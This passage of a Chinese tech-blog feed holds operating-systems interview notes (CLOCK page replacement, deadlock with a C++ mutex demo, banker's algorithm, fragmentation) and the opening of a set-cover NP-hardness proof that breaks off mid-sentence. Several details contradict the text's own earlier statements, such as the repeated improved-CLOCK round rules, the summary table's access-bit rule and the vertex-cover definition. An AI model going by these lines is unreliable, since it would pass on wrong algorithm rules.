Used)</p><p>简单的CLOCK算法实现方法:为每个页面设置一个访问位，再将内存中的页面都通过链接指针链接成一个循环队列。当某页被访问时，其访问位置为1。当需要淘汰-一个页面时，只需检查页的访问位。如果是0，就选择该页换出;如果是1，则将它置为0，暂不换出，继续检查下一个页面，若第- - ~轮扫描中所有页面都是1，则将这些页面的访问位依次置为0后，再进行第二轮扫描(第二轮扫描中一定会有访问位为0的页面，因此简单的CLOCK算法选择–个淘汰页面最多会经过两轮扫描)</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210227001445.png" alt=""></p><h5 id="5、改进型的时钟置换算法"><a href="#5、改进型的时钟置换算法" class="headerlink" title="5、改进型的时钟置换算法"></a>5、改进型的时钟置换算法</h5><p>简单的时钟置换算法仅考虑到一个页面最近是否被访问过。事实上，如果被淘汰的页面没有被修改过,就不需要执行I/O操作写回外存。只有被淘汰的页面被修改过时，才需要写回外存。</p><p>因此，除了考虑一个页面最近有没有被访问过之外，操作系统还应考虑页面有没有被修改过。在其他条件都相同时，应优先淘汰没有修改过的页面，避免I/O操作。这就是改进型的时钟置换算法的思想。修改位=0，表示页面没有被修改过;修改位=1，表示页面被修改过。</p><p>为方便讨论，用(访问位，修改位)的形式表示各页面状态。如(1, 1)表示一个页面近期被访问过，且被修改过。</p><p>改进型的Clock算法需要综合考虑某一内存页面的访问位和修改位来判断是否置换该页面。在实际编写算法过程中，同样可以用一个等长的整型数组来标识每个内存块的修改状态。访问位A和修改位M可以组成一下四种类型的页面。</p><p>算法规则:将所有可能被置换的页面排成–个循环队列</p><blockquote><p>第一轮:从当前位置开始扫描到第一个(A =0, M = 0)的帧用于替换。表示该页面最近既未被访问，又未被修改，是最佳淘汰页<br>第二轮:若第一轮扫描失败，则重新扫描，查找第一个(A =0, M = 1)的帧用于替换。本轮将所有扫描过的帧访问位设为0。表示该页面最近未被访问，但已被修改，并不是很好的淘汰页。<br>第三轮:若第二轮扫描失败，则重新扫描，查找第一个(A =1, M = 0)的帧用于替换。本轮扫描不修改任何标志位。表示该页面最近已被访问，但未被修改，该页有可能再被访问。<br>第四轮:若第三轮扫描失败，则重新扫描，查找第一个A =1, M = 1)的帧用于替换。表示该页最近已被访问且被修改，该页可能再被访问。</p></blockquote><p>由于第二轮已将所有帧的访问位设为0，因此经过第三轮、第四轮扫描一定会有一个帧被选中，因此改进型CLOCK置换算法选择- -个淘汰页面最多会进行四轮扫描</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210227001535.png" alt=""><br>算法规则：将所有可能被置换的页面排成一个循环队列<br>第一轮:从当前位置开始扫描到第-一个(0, 0)的帧用于替换。本轮扫描不修改任何标志位。(第一优先级:最近没访问，且没修改的页面)<br>第二轮:若第一轮扫描失败，则重新扫描，查找第一个(0, 1)的帧用于替换。本轮将所有扫描过的帧访问位设为0<br>(第二优先级: 最近没访问，但修改过的页面)<br>第三轮:若第二轮扫描失败，则重新扫描，查找第一个(0, 0)的帧用于替换。本轮扫描不修改任何标志位(第三优先级:最近访问过，但没修改的页面)<br>第四轮:若第三轮扫描失败，则重新扫描，查找第一个(0, 1)的帧用于替换。(第四优先级:最近访问过，且修改过的页面)<br>由于第二轮已将所有帧的访问位设为0，因此经过第三轮、第四轮扫描一定会有一个帧被选中，因此改进型CLOCK置换算法选择一个淘汰页面最多会进行四轮扫描</p><h5 id="6、总结"><a href="#6、总结" class="headerlink" title="6、总结"></a>6、总结</h5><div class="table-container"><table><thead><tr><th></th><th>算法规则</th><th>优缺点</th></tr></thead><tbody><tr><td>OPT</td><td>优先淘汰最长时间内不会被访问的页面</td><td>缺页率最小，性能最好;但无法实现</td></tr><tr><td>FIFO</td><td>优先淘汰最先进入内存的页面</td><td>实现简单;但性能很差，可能出现Belady异常</td></tr><tr><td>LRU</td><td>优先淘汰最近最久没访问的页面</td><td>性能很好;但需要硬件支持，算法开销大</td></tr><tr><td>CLOCK (NRU)</td><td>循环扫描各页面 第一轮淘汰访问位=0的，并将扫描过的页面访问位改为1。若第-轮没选中，则进行第二轮扫描。</td><td>实现简单，算法开销小;但未考虑页面是否被修改过。</td></tr><tr><td>改进型CLOCK (改进型NRU)</td><td>若用(访问位，修改位)的形式表述，则 第一轮:淘汰(0,0) 第二轮:淘汰(O,1)，并将扫描过的页面访问位都置为0 第三轮:淘汰(O, 0) 第四轮:淘汰(0, 1)</td><td>算法开销较小，性能也不错</td></tr></tbody></table></div><h4 id="58、共享是什么？"><a href="#58、共享是什么？" class="headerlink" title="58、共享是什么？"></a>58、共享是什么？</h4><p>共享是指系统中的资源可以被多个并发进程共同使用。</p><p>有两种共享方式：互斥共享和同时共享。</p><p>互斥共享的资源称为临界资源，例如打印机等，在同一时刻只允许一个进程访问，需要用同步机制来实现互斥访问。</p><h4 id="59、死锁相关问题大总结，超全！"><a href="#59、死锁相关问题大总结，超全！" class="headerlink" title="59、死锁相关问题大总结，超全！"></a>59、死锁相关问题大总结，超全！</h4><p><strong>死锁是指两个（多个）线程相互等待对方数据的过程，死锁的产生会导致程序卡死，不解锁程序将永远无法进行下去。</strong></p><h5 id="1、死锁产生原因"><a href="#1、死锁产生原因" class="headerlink" title="1、死锁产生原因"></a>1、死锁产生原因</h5><p>举个例子：两个线程A和B，两个数据1和2。线程A在执行过程中，首先对资源1加锁，然后再去给资源2加锁，但是由于线程的切换，导致线程A没能给资源2加锁。线程切换到B后，线程B先对资源2加锁，然后再去给资源1加锁，由于资源1已经被线程A加锁，因此线程B无法加锁成功，当线程切换为A时，A也无法成功对资源2加锁，由此就造成了线程AB双方相互对一个已加锁资源的等待，死锁产生。</p><p>理论上认为死锁产生有以下四个必要条件，缺一不可：</p><ol><li><p><strong>互斥条件</strong>：进程对所需求的资源具有排他性，若有其他进程请求该资源，请求进程只能等待。</p><ol><li><strong>不剥夺条件</strong>：进程在所获得的资源未释放前，不能被其他进程强行夺走，只能自己释放。</li><li><strong>请求和保持条件</strong>：进程当前所拥有的资源在进程请求其他新资源时，由该进程继续占有。</li><li><strong>循环等待条件</strong>：存在一种进程资源循环等待链，链中每个进程已获得的资源同时被链中下一个进程所请求。</li></ol></li></ol><h5 id="2、死锁演示"><a href="#2、死锁演示" class="headerlink" title="2、死锁演示"></a>2、死锁演示</h5><p>通过代码的形式进行演示，需要两个线程和两个互斥量。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;list></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;thread></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;mutex></span>  <span class="token comment">//引入互斥量头文件</span></span>using namespace std<span class="token punctuation">;</span>class A <span class="token punctuation">&#123;</span>public<span class="token operator">:</span><span class="token comment">//插入消息，模拟消息不断产生</span><span class="token keyword">void</span> <span class="token function">insertMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"插入一条消息:"</span> <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>my_mutex1<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//语句1</span>my_mutex2<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//语句2</span>Msg<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>my_mutex2<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>my_mutex1<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//读取消息</span><span class="token keyword">void</span> <span class="token function">readMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> MsgCom<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>MsgCom <span class="token operator">=</span> <span class="token function">MsgLULProc</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">MsgLULProc</span><span class="token punctuation">(</span>MsgCom<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//读出消息了</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"消息已读出"</span> <span class="token operator">&lt;&lt;</span> MsgCom <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token comment">//消息暂时为空</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"消息为空"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//加解锁代码</span>bool <span class="token function">MsgLULProc</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">&amp;</span>command<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> curMsg<span class="token punctuation">;</span>my_mutex2<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//语句3</span>my_mutex1<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//语句4</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Msg<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//读取消息，读完删除</span>command <span class="token operator">=</span> Msg<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Msg<span class="token punctuation">.</span><span class="token function">pop_front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>my_mutex1<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>my_mutex2<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>my_mutex1<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>my_mutex2<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> false<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>private<span class="token operator">:</span>std<span class="token operator">::</span>list<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> Msg<span class="token punctuation">;</span>  <span class="token comment">//消息变量</span>std<span class="token operator">::</span>mutex my_mutex1<span class="token punctuation">;</span> <span class="token comment">//互斥量对象1</span>std<span class="token operator">::</span>mutex my_mutex2<span class="token punctuation">;</span> <span class="token comment">//互斥量对象2</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>A a<span class="token punctuation">;</span><span class="token comment">//创建一个插入消息线程</span>std<span class="token operator">::</span>thread <span class="token function">insertTd</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>A<span class="token operator">::</span>insertMsg<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//这里要传入引用保证是同一个对象</span><span class="token comment">//创建一个读取消息线程</span>std<span class="token operator">::</span>thread <span class="token function">readTd</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>A<span class="token operator">::</span>readMsg<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//这里要传入引用保证是同一个对象</span>insertTd<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>readTd<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>语句1和语句2表示线程A先锁资源1，再锁资源2，语句3和语句4表示线程B先锁资源2再锁资源1，具备死锁产生的条件。</p><h5 id="3、死锁的解决方案"><a href="#3、死锁的解决方案" class="headerlink" title="3、死锁的解决方案"></a>3、死锁的解决方案</h5><p><strong>保证上锁的顺序一致。</strong></p><h5 id="4、死锁必要条件"><a href="#4、死锁必要条件" class="headerlink" title="4、死锁必要条件"></a>4、死锁必要条件</h5><ul><li>互斥条件：进程对所需求的资源具有排他性，若有其他进程请求该资源，请求进程只能等待。</li><li>不剥夺条件：进程在所获得的资源未释放前，不能被其他进程强行夺走，只能自己释放</li><li>请求和保持条件：进程当前所拥有的资源在进程请求其他新资源时，由该进程继续占有。</li><li>循环等待条件：存在一种进程资源循环等待链，链中每个进程已获得的资源同时被链中下一个进程所请求。</li></ul><h5 id="5、处理方法"><a href="#5、处理方法" class="headerlink" title="5、处理方法"></a>5、处理方法</h5><p>主要有以下四种方法：</p><ul><li>鸵鸟策略</li><li>死锁检测与死锁恢复</li><li>死锁预防</li><li>死锁避免</li></ul><p><strong>鸵鸟策略</strong></p><p>把头埋在沙子里，假装根本没发生问题。</p><p>因为解决死锁问题的代价很高，因此鸵鸟策略这种不采取任务措施的方案会获得更高的性能。</p><p>当发生死锁时不会对用户造成多大影响，或发生死锁的概率很低，可以采用鸵鸟策略。</p><p>大多数操作系统，包括 Unix，Linux 和 Windows，处理死锁问题的办法仅仅是忽略它。</p><p><strong>死锁检测与死锁恢复</strong></p><p>不试图阻止死锁，而是当检测到死锁发生时，采取措施进行恢复。</p><p>1、每种类型一个资源的死锁检测</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210227001659.png" alt=""></p><p>上图为资源分配图，其中方框表示资源，圆圈表示进程。资源指向进程表示该资源已经分配给该进程，进程指向资源表示进程请求获取该资源。</p><p>图 a 可以抽取出环，如图 b，它满足了环路等待条件，因此会发生死锁。</p><p>每种类型一个资源的死锁检测算法是通过检测有向图是否存在环来实现，从一个节点出发进行深度优先搜索，对访问过的节点进行标记，如果访问了已经标记的节点，就表示有向图存在环，也就是检测到死锁的发生。</p><p>2、每种类型多个资源的死锁检测</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210227001758.png" alt=""></p><p>上图中，有三个进程四个资源，每个数据代表的含义如下：</p><ul><li>E 向量：资源总量</li><li>A 向量：资源剩余量</li><li>C 矩阵：每个进程所拥有的资源数量，每一行都代表一个进程拥有资源的数量</li><li>R 矩阵：每个进程请求的资源数量</li></ul><p>进程 P<sub>1</sub> 和 P<sub>2</sub> 所请求的资源都得不到满足，只有进程 P<sub>3</sub> 可以，让 P<sub>3</sub> 执行，之后释放 P<sub>3</sub> 拥有的资源，此时 A = (2 2 2 0)。P<sub>2</sub> 可以执行，执行后释放 P<sub>2</sub> 拥有的资源，A = (4 2 2 1) 。P<sub>1</sub> 也可以执行。所有进程都可以顺利执行，没有死锁。</p><p>算法总结如下：</p><p>每个进程最开始时都不被标记，执行过程有可能被标记。当算法结束时，任何没有被标记的进程都是死锁进程。</p><ol><li>寻找一个没有标记的进程 P<sub>i</sub>，它所请求的资源小于等于 A。</li><li>如果找到了这样一个进程，那么将 C 矩阵的第 i 行向量加到 A 中，标记该进程，并转回 1。</li><li>如果没有这样一个进程，算法终止。</li></ol><h5 id="6、死锁恢复"><a href="#6、死锁恢复" class="headerlink" title="6、死锁恢复"></a>6、死锁恢复</h5><ul><li>利用抢占恢复</li><li>利用回滚恢复</li><li>通过杀死进程恢复</li></ul><h5 id="7、死锁预防"><a href="#7、死锁预防" class="headerlink" title="7、死锁预防"></a>7、死锁预防</h5><p>在程序运行之前预防发生死锁。</p><ol><li>破坏互斥条件</li></ol><p>例如假脱机打印机技术允许若干个进程同时输出，唯一真正请求物理打印机的进程是打印机守护进程。</p><ol><li>破坏请求和保持条件</li></ol><p>一种实现方式是规定所有进程在开始执行前请求所需要的全部资源。</p><ol><li>破坏不剥夺条件</li></ol><p>允许抢占资源</p><ol><li>破坏循环请求等待</li></ol><p>给资源统一编号，进程只能按编号顺序来请求资源。</p><h5 id="8、死锁避免"><a href="#8、死锁避免" class="headerlink" title="8、死锁避免"></a>8、死锁避免</h5><p>在程序运行时避免发生死锁。</p><ol><li><strong>安全状态</strong></li></ol><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210227001840.png" alt=""></p><p>图 a 的第二列 Has 表示已拥有的资源数，第三列 Max 表示总共需要的资源数，Free 表示还有可以使用的资源数。从图 a 开始出发，先让 B 拥有所需的所有资源（图 b），运行结束后释放 B，此时 Free 变为 5（图 c）；接着以同样的方式运行 C 和 A，使得所有进程都能成功运行，因此可以称图 a 所示的状态时安全的。</p><p>定义：如果没有死锁发生，并且即使所有进程突然请求对资源的最大需求，也仍然存在某种调度次序能够使得每一个进程运行完毕，则称该状态是安全的。</p><p>安全状态的检测与死锁的检测类似，因为安全状态必须要求不能发生死锁。下面的银行家算法与死锁检测算法非常类似，可以结合着做参考对比。</p><ol><li><strong>单个资源的银行家算法</strong></li></ol><p>一个小城镇的银行家，他向一群客户分别承诺了一定的贷款额度，算法要做的是判断对请求的满足是否会进入不安全状态，如果是，就拒绝请求；否则予以分配。</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210227001911.png" alt=""></p><p>上图 c 为不安全状态，因此算法会拒绝之前的请求，从而避免进入图 c 中的状态。</p><ol><li><strong>多个资源的银行家算法</strong></li></ol><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210227001939.png" alt=""></p><p>上图中有五个进程，四个资源。左边的图表示已经分配的资源，右边的图表示还需要分配的资源。最右边的 E、P 以及 A 分别表示：总资源、已分配资源以及可用资源，注意这三个为向量，而不是具体数值，例如 A=(1020)，表示 4 个资源分别还剩下 1/0/2/0。</p><p>4、<strong>检查一个状态是否安全的算法如下</strong>：</p><ul><li>查找右边的矩阵是否存在一行小于等于向量 A。如果不存在这样的行，那么系统将会发生死锁，状态是不安全的。</li><li>假若找到这样一行，将该进程标记为终止，并将其已分配资源加到 A 中。</li><li>重复以上两步，直到所有进程都标记为终止，则状态时安全的。</li></ul><p>如果一个状态不是安全的，需要拒绝进入这个状态。</p><h4 id="60、为什么分段式存储管理有外部碎片而无内部碎片？为什么固定分区分配有内部碎片而不会有外部碎片？"><a href="#60、为什么分段式存储管理有外部碎片而无内部碎片？为什么固定分区分配有内部碎片而不会有外部碎片？" class="headerlink" title="60、为什么分段式存储管理有外部碎片而无内部碎片？为什么固定分区分配有内部碎片而不会有外部碎片？"></a>60、为什么分段式存储管理有外部碎片而无内部碎片？为什么固定分区分配有内部碎片而不会有外部碎片？</h4><p>分段式分配是按需分配，而固定式分配是固定分配的方式</p><h4 id="61、内部碎片与外部碎片"><a href="#61、内部碎片与外部碎片" class="headerlink" title="61、内部碎片与外部碎片"></a>61、内部碎片与外部碎片</h4><p>内碎片：分配给某些进程的内存区域中有些部分没用上，常见于固定分配方式</p><p>内存总量相同，100M</p><p>固定分配，将100M分割成10块，每块10M，一个程序需要45M，那么需要分配5块，第五块只用了5M，剩下的5M就是内部碎片；</p><p>分段式分配，按需分配，一个程序需要45M，就给分片45MB，剩下的55M供其它程序使用，不存在内部碎片。</p><p>外碎片：内存中某些空闲区因为比较小，而难以利用上，一般出现在内存动态分配方式中</p><p>分段式分配：内存总量相同，100M，比如，内存分配依次5M，15M，50M，25M，程序运行一段时间之后，5M，15M的程序运行完毕，释放内存，其他程序还在运行，再次分配一个10M的内存供其它程序使用，只能从头开始分片，这样，就会存在10M+5M的外部碎片 </p><h4 id="62、如何消除碎片文件"><a href="#62、如何消除碎片文件" class="headerlink" title="62、如何消除碎片文件"></a>62、如何消除碎片文件</h4><p>对于外部碎片，通过<strong>紧凑技术</strong>消除，就是操作系统不时地对进程进行移动和整理。但是这需要动态重定位寄存器地支持，且相对费时。紧凑地过程实际上类似于Windows系统中地磁盘整理程序，只不过后者是对外存空间地紧凑</p><p>解决外部内存碎片的问题就是<strong>内存交换</strong>。</p><p>可以把音乐程序占用的那 256MB 内存写到硬盘上，然后再从硬盘上读回来到内存里。不过再读回的时候，我们不能装载回原来的位置，而是紧紧跟着那已经被占用了的 512MB 内存后面。这样就能空缺出连续的 256MB 空间，于是新的 200MB 程序就可以装载进来。</p><p>回收内存时要尽可能地将相邻的空闲空间合并。</p><p><a id="network"></a></p><h2 id="sob-计算机网络"><a href="#sob-计算机网络" class="headerlink" title=":sob: 计算机网络"></a>:sob: 计算机网络</h2><p>正在整理ing，敬请期待</p><p><a id="algorithm"></a></p><h2 id="scream-数据结构与算法"><a href="#scream-数据结构与算法" class="headerlink" title=":scream: 数据结构与算法"></a>:scream: 数据结构与算法</h2><p>正在整理ing，敬请期待</p><p><a id="db"></a></p><h2 id="tired-face-数据库-MySQL、Redis"><a href="#tired-face-数据库-MySQL、Redis" class="headerlink" title=":tired_face:数据库(MySQL、Redis)"></a>:tired_face:数据库(MySQL、Redis)</h2><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>正在整理ing，敬请期待</p><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>正在整理ing，敬请期待</p><p><a id="qingjingti"></a></p><h2 id="sweat-常见智力题、情景题"><a href="#sweat-常见智力题、情景题" class="headerlink" title=":sweat: 常见智力题、情景题"></a>:sweat: 常见智力题、情景题</h2><p>正在整理ing，敬请期待</p><p><a id="feijishu"></a></p><h2 id="grin-常见非技术性问题-比如你最大的缺点是什么"><a href="#grin-常见非技术性问题-比如你最大的缺点是什么" class="headerlink" title=":grin: 常见非技术性问题(比如你最大的缺点是什么)"></a>:grin: 常见非技术性问题(比如你最大的缺点是什么)</h2><p>正在整理ing，敬请期待</p><p><a id="other"></a></p><h2 id="dog-未完待续…"><a href="#dog-未完待续…" class="headerlink" title=":dog: 未完待续….."></a>:dog: 未完待续…..</h2>]]></content>
      
      
      <categories>
          
          <category> c </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>证明NP难问题</title>
      <link href="/2022/09/22/%E8%AF%81%E6%98%8ENP%E9%9A%BE%E9%97%AE%E9%A2%98/"/>
      <url>/2022/09/22/%E8%AF%81%E6%98%8ENP%E9%9A%BE%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="1-相关概念"><a href="#1-相关概念" class="headerlink" title="1. 相关概念"></a>1. 相关概念</h1><h2 id="NP相关定义"><a href="#NP相关定义" class="headerlink" title="NP相关定义"></a>NP相关定义</h2><ul><li>P问题：存在多项式时间算法的问题。</li><li>NP问题：可以在多项式时间验证结果正确性的问题。简单来说，就是不知道这个问题存不存在一个多项式时间的算法，但是可以在多项式时间内验证并得出这个问题的一个正确解（可行解）。（用TSP问题来举例子，此处验证的意思是：给一条路径，再给一个值，验证这个路径是不是小于这个值）。</li><li>NPC问题：存在这样一个NP问题，所有的NP问题都可以归约到它。</li></ul><h2 id="NP-hard-和-NP-Complete"><a href="#NP-hard-和-NP-Complete" class="headerlink" title="NP-hard 和 NP-Complete"></a>NP-hard 和 NP-Complete</h2><p>判断一个问题是不是NP-Complete有两个步骤：</p><p>1、判断是否NP，就是算法结果的正确性能不能在多项式时间内验证</p><p>2、判断是否NP-hard，要判断NP-hard，我们可以使用一个叫Reduction的技巧。直观来说，如果你能用你的问题的求解器来求解另一个已知是NP-hard问题，那么你的问题也是NP-Hard的。</p><h2 id="归约（Reduction）"><a href="#归约（Reduction）" class="headerlink" title="归约（Reduction）"></a>归约（Reduction）</h2><p>函数定义：对于问题$A$和问题$B$，如果存在一个可以计算的函数$f$，使得对于任意问题A的实例$x$，都有$A(x) = B(f(x))$，那么就说问题$A$可以被归约到问题$B$上。</p><p>Reduction是将两个算法建立联系的一个过程。我们说A reduce 到B，意味着，假设现在有一个B的黑盒求解器，于是我们设计一个多项式算法来用B的求解器来求解问题A，简单来说归约就是，可以用问题B的算法来解决A ，我们就说问题A可以约化成问题B：直观的认为，被约化成的问题应具有比前一个问题更复杂的时间复杂度。</p><p>当这个求解器是多项式时间的时候，意味着X也可以多项式求解。那如果我们已经知道X是很难求解，如果X可以reduce到Y，那么意味着Y跟X一样难解，因为只有困难的求解器才能解决困难的问题。</p><h2 id="判定问题：可计算理论的核心问题"><a href="#判定问题：可计算理论的核心问题" class="headerlink" title="判定问题：可计算理论的核心问题"></a>判定问题：可计算理论的核心问题</h2><p>表现为寻求一种能行的方法、一种机械的程序或者算法，从而能够对某类问题中的任何一个在有穷步骤内确定是否具有某一特定的性质。</p><h2 id="证明NP难问题的一般步骤"><a href="#证明NP难问题的一般步骤" class="headerlink" title="证明NP难问题的一般步骤"></a>证明NP难问题的一般步骤</h2><p>要证明集合覆盖问题是NP难的，我们只需要证明集合覆盖问题的判定问题是NP完全问题即可。而要证明一个判定问题属于NPC问题，一般需要两个步骤：第一步，证明集合覆盖的判定问题属于NP问题；第二步，证明集合覆盖的判定问题可以归约到一个已经被证明了的NPC问题上去。</p><h1 id="2-证明集合覆盖问题是NP难问题"><a href="#2-证明集合覆盖问题是NP难问题" class="headerlink" title="2. 证明集合覆盖问题是NP难问题"></a>2. 证明集合覆盖问题是NP难问题</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>集合覆盖问题的一个实例$⟨X,F⟩$ 由一个有限集$X$及$X$的一个子集族$F$组成。子集族$F$覆盖了有限集$X$。集合覆盖问题就是要找出$F$中覆盖$X$的最小子集 $C∗$，使得 $|C∗|=min{|C||C∈F⋀C覆盖X}$ </p><p>证明集合覆盖问题是NP难的。</p><h2 id="数学描述"><a href="#数学描述" class="headerlink" title="数学描述"></a>数学描述</h2><ul><li><p>集合覆盖的判定问题：给定一个包含 $n$ 个元素的集合 $U$；一个由 $m$ 个子集 $S_i⊆U$ 的构成的集合；以及一个整数 $k$。判定是否存在集合 $C⊆{1,2,…,m},|C|≤k$ ，使得相应子集 $S_i$ 能够覆盖集合 $U$ 中的所有元素，即</p><script type="math/tex; mode=display">\bigcup_{i \in C}{S_i} = U</script></li><li><p>顶点覆盖的判定问题：给定一个图$G=⟨V,E⟩$ ，一个整数$q$，判定是否存在小于$q$的顶点覆盖$W$，使得对任意一条边${i,j}\in E$ 都有 $i∈E$ 或者$j∈E$。</p></li></ul><h2 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h2><ul><li><p>第一步，证明集合覆盖的判定问题是属于NP问题的</p><p>  对于任意给定的一个集合C，可以在多项式时间内检测出C中元素的个数是否超过k，也可以检验出这| C |个子集的并集是否覆盖了U中的所有元素。</p></li><li><p>第二步，我们证明集合覆盖的判定问题可以归约到图的顶点覆盖问题上。</p><p>  任意给定一个顶点覆盖问题$G=⟨V,E⟩$以及整数 $q$，我们将根据如下规则生成一个对应的集合覆盖问题。令全集$U=E$；集合中的$n$个元素定义如下：将图$G$中的顶点分别标记为1到$n$，子集$S_i$表示所有指向顶点i边的集合，满足$S_i⊆U$；整数$k=q$。经过这样的变换，我们可以在多项式的时间内将一个顶点覆盖问题转化为一个集合覆盖问题。假设我们有一个“魔法求解器”可以对集合覆盖进行快速判定。接下来证明顶点覆盖问题判定为真当且仅当对应的集合覆盖问题为真。</p><p>  设图$G$存在大小为$q$的顶点覆盖，令$W$为这些顶点集合。根据变换规则，$W$对应集合覆盖问题中的一系列子集$C$，由于$k=q$，$C$最多包含$k$个元素。下面说明子集$C$覆盖$U$：对于$U$中的任意一个元素$e={i,j}$ ， $e$是图 $G$ 中的一条边；由于 $W$ 是图$G$的顶点覆盖（${ i,j }∈E$都有$i∈E$ 或者$j∈E$），所以元素 $e={i,j}$ 至少跟$W$中点 $i$ 或者 